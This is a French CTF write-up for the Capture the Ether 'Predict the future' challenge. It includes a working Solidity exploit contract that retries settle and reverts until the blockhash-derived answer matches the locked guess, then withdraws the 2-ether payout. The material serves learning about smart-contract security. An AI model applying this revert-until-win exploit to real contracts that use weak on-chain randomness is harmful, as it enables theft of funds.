# Predict the future

## Intitulé 

[Url du challenge](https://capturetheether.com/challenges/lotteries/predict-the-future/)

> This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.
> 
> Note that it is indeed possible to solve this challenge without losing any ether.

## Solution

Dans ce challenge, il faut vérouiller une proposition avec `lockInGuess`, et ensuite tester si elle est juste avec `settle`. Regardons le fonction `settle` de plus près :

```solidity

function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
}
```

`answer` est un hash modulo 10, ce qui veut dire que les solutions sont comprises dans [0,9]. Nous allons utiliser ici une propriété importante dans solidity : les `require`. Ils permettent d'annuler complètement une transaction si certaines conditions ne sont pas respectés. Le gas est perdu, mais l'état de notre smart contract reste inchangé.

Ouvrons [Remix](https://remix.ethereum.org/) et créons un smart contract qui vas réaliser notre challenge.

```solidity

contract Exploit {

    // on propose 0 comme solution
    function propose(PredictTheFutureChallenge challenge) external payable {
        require(msg.value == 1 ether);
        challenge.lockInGuess.value(1 ether)(0);
    }

    function attack(PredictTheFutureChallenge challenge) external payable {
        // on essaie de résoudre le challenge
        challenge.settle();

        // si le challenge n'est pas résolu, on annule la transaction
        require(challenge.isComplete());
    }

    // pour accepter les eth, sans cette fonction, on aurait un revert en réussissant le challenge
    function() external payable {}

    // pour withdraw
    function withdraw() external {
        msg.sender.transfer(2 ether);
    }
}
```

Dans le même fichier solidity, copier les 2 contrats à la suite (Challenge.sol et l'Exploit). Compiler et lancer la fonction  `propose` puis `attack` avec comme argument l'addresse du challenge. Si la transaction échoue, alors challenge n'a pas été résolu, il faut relancer la fonction `attack`.

Penser à utiliser la fonction `withdraw` pour récupérer vos fonds. Il ne reste qu'à valider le challenge !